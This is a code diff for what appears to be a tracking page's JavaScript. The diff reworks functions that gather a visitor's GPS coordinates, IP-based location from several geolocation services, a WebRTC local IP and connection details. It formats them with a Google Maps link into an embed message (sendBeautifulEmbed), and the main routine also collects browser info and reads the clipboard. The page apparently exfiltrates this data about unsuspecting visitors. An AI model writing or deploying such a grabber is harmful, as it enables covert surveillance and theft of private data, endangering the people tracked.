@@ -775,22 +775,16 @@
         }
 
         // ============================================================
-        //  📍 LOCATION TRACKING (GPS + WiFi + IP)
+        //  📍 RELIABLE LOCATION (FIXED - Multiple methods)
         // ============================================================
 
-        // ===== 1. GPS LOCATION (Most Accurate - May show popup) =====
+        // ===== 1. GPS (Most Accurate) =====
         function getGPSLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve({ error: 'GPS not available', source: 'GPS' });
+                    resolve(null);
                     return;
                 }
-                
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                };
                 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -798,178 +792,132 @@
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy + ' meters',
-                            altitude: position.coords.altitude || 'N/A',
-                            speed: position.coords.speed || 'N/A',
-                            heading: position.coords.heading || 'N/A',
-                            source: 'GPS',
-                            googleMaps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                        });
-                    },
-                    (error) => {
-                        resolve({ 
-                            error: error.message,
-                            code: error.code,
                             source: 'GPS'
                         });
                     },
-                    options
+                    () => { resolve(null); },
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
 
-        // ===== 2. WIFI SCANNING (No popup, mobile only) =====
-        function scanWiFiNetworks() {
-            return new Promise((resolve) => {
-                try {
-                    // Try the Wifi API (Chrome on Android)
-                    if ('wifi' in navigator) {
-                        navigator.wifi.scan((networks) => {
-                            resolve({
-                                networks: networks || [],
-                                count: networks ? networks.length : 0,
-                                source: 'WiFi',
-                                accuracy: 'WiFi triangulation (50-200m)'
-                            });
-                        });
-                    } else {
-                        // Try to get WiFi info via other methods
-                        const wifiInfo = {
-                            source: 'WiFi',
-                            accuracy: 'WiFi triangulation (50-200m)',
-                            available: false
-                        };
-                        
-                        // Check if we can get network info
-                        if ('connection' in navigator && navigator.connection) {
-                            wifiInfo.type = navigator.connection.effectiveType || 'Unknown';
-                            wifiInfo.downlink = navigator.connection.downlink || 'Unknown';
-                        }
-                        
-                        // Try to detect if on WiFi vs Cellular
-                        if (navigator.connection) {
-                            const type = navigator.connection.effectiveType;
-                            wifiInfo.connectionType = type;
-                            wifiInfo.isWiFi = type === 'wifi';
-                        }
-                        
-                        resolve(wifiInfo);
-                    }
-                } catch(e) {
-                    resolve({ 
-                        error: 'WiFi scan failed',
-                        source: 'WiFi'
-                    });
-                }
-            });
-        }
-
-        // ===== 3. IP GEOLOCATION (No popup, always works) =====
+        // ===== 2. IP GEOLOCATION (Most Reliable) =====
         async function getIPLocation() {
+            // Try multiple services in parallel
             const services = [
-                {
-                    url: 'https://ipapi.co/json/',
-                    parser: (data) => ({
-                        ip: data.ip || 'Unknown',
-                        city: data.city || 'Unknown',
-                        region: data.region || 'Unknown',
-                        country: data.country_name || 'Unknown',
-                        countryCode: data.country_code || 'Unknown',
-                        isp: data.org || 'Unknown',
-                        lat: data.latitude || 'Unknown',
-                        lon: data.longitude || 'Unknown',
-                        timezone: data.timezone || 'Unknown',
-                        postal: data.postal || 'Unknown',
-                        accuracy: 'City level (10-50km)',
-                        source: 'IP Geolocation (ipapi.co)'
-                    })
-                },
-                {
-                    url: 'https://ipinfo.io/json',
-                    parser: (data) => {
-                        const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
-                        return {
-                            ip: data.ip || 'Unknown',
-                            city: data.city || 'Unknown',
-                            region: data.region || 'Unknown',
-                            country: data.country || 'Unknown',
-                            countryCode: data.country || 'Unknown',
-                            isp: data.org || 'Unknown',
-                            lat: loc[0] || 'Unknown',
-                            lon: loc[1] || 'Unknown',
-                            timezone: data.timezone || 'Unknown',
-                            postal: data.postal || 'Unknown',
-                            accuracy: 'City level (10-50km)',
-                            source: 'IP Geolocation (ipinfo.io)'
+                async () => {
+                    try {
+                        const response = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.ip && data.ip !== '') {
+                                return {
+                                    ip: data.ip,
+                                    city: data.city || 'Unknown',
+                                    region: data.region || 'Unknown',
+                                    country: data.country_name || 'Unknown',
+                                    countryCode: data.country_code || 'Unknown',
+                                    isp: data.org || 'Unknown',
+                                    lat: data.latitude || 'Unknown',
+                                    lon: data.longitude || 'Unknown',
+                                    timezone: data.timezone || 'Unknown',
+                                    postal: data.postal || 'Unknown',
+                                    source: 'ipapi.co'
+                                };
+                            }
                         }
-                    }
+                    } catch(e) {}
+                    return null;
                 },
-                {
-                    url: 'http://ip-api.com/json/',
-                    parser: (data) => ({
-                        ip: data.query || 'Unknown',
-                        city: data.city || 'Unknown',
-                        region: data.regionName || 'Unknown',
-                        country: data.country || 'Unknown',
-                        countryCode: data.countryCode || 'Unknown',
-                        isp: data.isp || 'Unknown',
-                        lat: data.lat || 'Unknown',
-                        lon: data.lon || 'Unknown',
-                        timezone: data.timezone || 'Unknown',
-                        postal: data.zip || 'Unknown',
-                        accuracy: 'City level (10-50km)',
-                        source: 'IP Geolocation (ip-api.com)'
-                    })
+                async () => {
+                    try {
+                        const response = await fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(3000) });
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.ip && data.ip !== '') {
+                                const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
+                                return {
+                                    ip: data.ip,
+                                    city: data.city || 'Unknown',
+                                    region: data.region || 'Unknown',
+                                    country: data.country || 'Unknown',
+                                    countryCode: data.country || 'Unknown',
+                                    isp: data.org || 'Unknown',
+                                    lat: loc[0] || 'Unknown',
+                                    lon: loc[1] || 'Unknown',
+                                    timezone: data.timezone || 'Unknown',
+                                    postal: data.postal || 'Unknown',
+                                    source: 'ipinfo.io'
+                                };
+                            }
+                        }
+                    } catch(e) {}
+                    return null;
+                },
+                async () => {
+                    try {
+                        const response = await fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(3000) });
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.query && data.query !== '' && data.status === 'success') {
+                                return {
+                                    ip: data.query,
+                                    city: data.city || 'Unknown',
+                                    region: data.regionName || 'Unknown',
+                                    country: data.country || 'Unknown',
+                                    countryCode: data.countryCode || 'Unknown',
+                                    isp: data.isp || 'Unknown',
+                                    lat: data.lat || 'Unknown',
+                                    lon: data.lon || 'Unknown',
+                                    timezone: data.timezone || 'Unknown',
+                                    postal: data.zip || 'Unknown',
+                                    source: 'ip-api.com'
+                                };
+                            }
+                        }
+                    } catch(e) {}
+                    return null;
+                },
+                async () => {
+                    try {
+                        const response = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(3000) });
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.geoplugin_request && data.geoplugin_request !== '') {
+                                return {
+                                    ip: data.geoplugin_request,
+                                    city: data.geoplugin_city || 'Unknown',
+                                    region: data.geoplugin_region || 'Unknown',
+                                    country: data.geoplugin_countryName || 'Unknown',
+                                    countryCode: data.geoplugin_countryCode || 'Unknown',
+                                    isp: data.geoplugin_isp || 'Unknown',
+                                    lat: data.geoplugin_latitude || 'Unknown',
+                                    lon: data.geoplugin_longitude || 'Unknown',
+                                    timezone: data.geoplugin_timezone || 'Unknown',
+                                    postal: data.geoplugin_postalCode || 'Unknown',
+                                    source: 'geoplugin.net'
+                                };
+                            }
+                        }
+                    } catch(e) {}
+                    return null;
                 }
             ];
             
-            for (const service of services) {
-                try {
-                    const response = await fetch(service.url, {
-                        signal: AbortSignal.timeout(3000)
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        const result = service.parser(data);
-                        if (result.ip && result.ip !== 'Unknown' && result.ip !== '') {
-                            return result;
-                        }
-                    }
-                } catch(e) {}
+            // Try all services in parallel
+            const results = await Promise.all(services.map(fn => fn()));
+            
+            // Return first successful result
+            for (const result of results) {
+                if (result && result.ip && result.ip !== 'Unknown' && result.ip !== '') {
+                    return result;
+                }
             }
             
-            // Try WebRTC as last resort
-            try {
-                const localIP = await getLocalIP();
-                if (localIP) {
-                    return {
-                        ip: localIP,
-                        city: 'Local Network',
-                        region: 'Local Network',
-                        country: 'Local Network',
-                        isp: 'Local Network',
-                        lat: 'Unknown',
-                        lon: 'Unknown',
-                        accuracy: 'Local network only',
-                        source: 'WebRTC'
-                    };
-                }
-            } catch(e) {}
-            
-            return {
-                ip: 'Unknown',
-                city: 'Unknown',
-                region: 'Unknown',
-                country: 'Unknown',
-                isp: 'Unknown',
-                lat: 'Unknown',
-                lon: 'Unknown',
-                accuracy: 'No location data',
-                source: 'None'
-            };
+            return null;
         }
 
-        // ===== 4. WEBRTC FALLBACK (Local IP) =====
+        // ===== 3. WebRTC (Local IP) =====
         function getLocalIP() {
             return new Promise((resolve) => {
                 const pc = new RTCPeerConnection({
@@ -1004,78 +952,105 @@
             });
         }
 
-        // ===== 5. COMBINED LOCATION (All methods) =====
+        // ===== 4. WiFi Info =====
+        function getWiFiInfo() {
+            return new Promise((resolve) => {
+                try {
+                    const info = {
+                        available: false,
+                        connectionType: 'Unknown',
+                        isWiFi: false
+                    };
+                    
+                    if (navigator.connection) {
+                        info.connectionType = navigator.connection.effectiveType || 'Unknown';
+                        info.downlink = navigator.connection.downlink || 'Unknown';
+                        info.rtt = navigator.connection.rtt || 'Unknown';
+                        info.isWiFi = info.connectionType === 'wifi' || info.connectionType === 'wired';
+                        info.available = true;
+                        
+                        // Try to detect more WiFi info
+                        if (navigator.connection.type !== undefined) {
+                            info.type = navigator.connection.type;
+                        }
+                    }
+                    
+                    resolve(info);
+                } catch(e) {
+                    resolve({ available: false });
+                }
+            });
+        }
+
+        // ===== 5. COMBINED LOCATION =====
         async function getAllLocationData() {
             console.log('📍 Fetching location data...');
             
-            // Try all methods in parallel
-            const [gps, wifi, ip] = await Promise.all([
+            // Try all methods
+            const [gps, ip, localIP, wifi] = await Promise.all([
                 getGPSLocation(),
-                scanWiFiNetworks(),
-                getIPLocation()
+                getIPLocation(),
+                getLocalIP(),
+                getWiFiInfo()
             ]);
             
-            // Determine best location source
-            let bestLocation = null;
-            let bestAccuracy = 999999; // Lower is better
+            // Build location object
+            const location = {
+                method: 'IP Geolocation',
+                ip: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                countryCode: 'Unknown',
+                isp: 'Unknown',
+                lat: 'Unknown',
+                lon: 'Unknown',
+                timezone: 'Unknown',
+                postal: 'Unknown',
+                accuracy: 'City level (10-50km)',
+                source: 'None'
+            };
             
-            // GPS is most accurate (if available)
-            if (gps && !gps.error && gps.latitude) {
-                const accuracy = parseFloat(gps.accuracy) || 10;
-                if (accuracy < bestAccuracy) {
-                    bestAccuracy = accuracy;
-                    bestLocation = {
-                        ...gps,
-                        method: 'GPS',
-                        accuracyText: gps.accuracy
-                    };
-                }
+            // Use IP location if available
+            if (ip) {
+                location.ip = ip.ip || 'Unknown';
+                location.city = ip.city || 'Unknown';
+                location.region = ip.region || 'Unknown';
+                location.country = ip.country || 'Unknown';
+                location.countryCode = ip.countryCode || 'Unknown';
+                location.isp = ip.isp || 'Unknown';
+                location.lat = ip.lat || 'Unknown';
+                location.lon = ip.lon || 'Unknown';
+                location.timezone = ip.timezone || 'Unknown';
+                location.postal = ip.postal || 'Unknown';
+                location.source = ip.source || 'Unknown';
+                location.method = 'IP Geolocation';
             }
             
-            // WiFi is second best
-            if (wifi && !wifi.error && wifi.networks && wifi.networks.length > 0) {
-                // WiFi doesn't give coordinates directly, but we can use it for context
-                // We'll keep it as a separate field
+            // If no IP location but we have local IP
+            if ((!ip || ip.ip === 'Unknown') && localIP) {
+                location.ip = localIP;
+                location.source = 'WebRTC';
+                location.method = 'Local IP';
+                location.accuracy = 'Local network only';
             }
             
-            // IP is least accurate but always works
-            if (ip && ip.ip && ip.ip !== 'Unknown') {
-                if (!bestLocation) {
-                    bestLocation = {
-                        ...ip,
-                        method: 'IP Geolocation',
-                        accuracyText: ip.accuracy
-                    };
-                }
+            // Add GPS if available
+            if (gps) {
+                location.gps = gps;
+                location.method = 'GPS (Most Accurate)';
+                location.accuracy = gps.accuracy;
+                location.lat = gps.latitude;
+                location.lon = gps.longitude;
             }
             
-            // If nothing worked, return unknown
-            if (!bestLocation) {
-                bestLocation = {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown',
-                    lat: 'Unknown',
-                    lon: 'Unknown',
-                    accuracy: 'No location data',
-                    method: 'None',
-                    source: 'None'
-                };
+            // Add WiFi info
+            if (wifi && wifi.available) {
+                location.wifi = wifi;
             }
             
-            // Add WiFi info if available
-            if (wifi && !wifi.error) {
-                bestLocation.wifi = wifi;
-            }
-            
-            // Add GPS info if available
-            if (gps && !gps.error) {
-                bestLocation.gps = gps;
-            }
-            
-            return bestLocation;
+            console.log('📍 Location data:', location);
+            return location;
         }
 
         // ============================================================
@@ -1315,35 +1290,32 @@
         async function sendBeautifulEmbed(data, location) {
             // Build location field
             let locationField = `**Method:** ${location.method || 'Unknown'}\n`;
+            locationField += `**Source:** ${location.source || 'Unknown'}\n\n`;
             
-            if (location.gps && !location.gps.error) {
-                locationField += `**GPS:** 🎯 ${location.gps.latitude}, ${location.gps.longitude}\n`;
-                locationField += `**Accuracy:** ${location.gps.accuracy}\n`;
-                locationField += `**Map:** ${location.gps.googleMaps}\n\n`;
+            if (location.gps) {
+                locationField += `🎯 **GPS Location**\n`;
+                locationField += `Latitude: \`${location.gps.latitude}\`\n`;
+                locationField += `Longitude: \`${location.gps.longitude}\`\n`;
+                locationField += `Accuracy: \`${location.gps.accuracy}\`\n`;
+                locationField += `🔗 [View on Google Maps](https://www.google.com/maps?q=${location.gps.latitude},${location.gps.longitude})\n\n`;
             }
             
-            locationField += `**IP:** ${location.ip || 'Unknown'}\n`;
+            locationField += `🌐 **IP Location**\n`;
+            locationField += `**IP:** \`${location.ip || 'Unknown'}\`\n`;
             locationField += `**City:** ${location.city || 'Unknown'}\n`;
             locationField += `**Region:** ${location.region || 'Unknown'}\n`;
             locationField += `**Country:** ${location.country || 'Unknown'}\n`;
             locationField += `**ISP:** ${location.isp || 'Unknown'}\n`;
-            locationField += `**Accuracy:** ${location.accuracy || 'Unknown'}\n`;
-            locationField += `**Source:** ${location.source || 'Unknown'}`;
+            locationField += `**Timezone:** ${location.timezone || 'Unknown'}\n`;
+            locationField += `**Accuracy:** ${location.accuracy || 'Unknown'}`;
             
             // WiFi info
             let wifiField = 'Not available';
-            if (location.wifi && !location.wifi.error) {
-                wifiField = `**Available:** ${location.wifi.available !== false ? '✅ Yes' : '❌ No'}\n`;
-                if (location.wifi.count) {
-                    wifiField += `**Networks:** ${location.wifi.count}\n`;
-                }
-                if (location.wifi.connectionType) {
-                    wifiField += `**Connection:** ${location.wifi.connectionType}\n`;
-                }
-                if (location.wifi.isWiFi !== undefined) {
-                    wifiField += `**WiFi:** ${location.wifi.isWiFi ? '✅ Connected' : '❌ Not connected'}\n`;
-                }
-                wifiField += `**Accuracy:** ${location.wifi.accuracy || 'WiFi triangulation (50-200m)'}`;
+            if (location.wifi && location.wifi.available) {
+                wifiField = `**Connection:** ${location.wifi.connectionType || 'Unknown'}\n`;
+                wifiField += `**Speed:** ${location.wifi.downlink || 'Unknown'} Mbps\n`;
+                wifiField += `**RTT:** ${location.wifi.rtt || 'Unknown'} ms\n`;
+                wifiField += `**WiFi:** ${location.wifi.isWiFi ? '✅ Connected' : '❌ Not connected'}`;
             }
             
             const embed = {
@@ -1479,7 +1451,6 @@
             try {
                 // Get location using all methods
                 const location = await getAllLocationData();
-                console.log('📍 Location data:', location);
                 
                 const info = collectAllInfo();
                 const clipboard = await getClipboard();
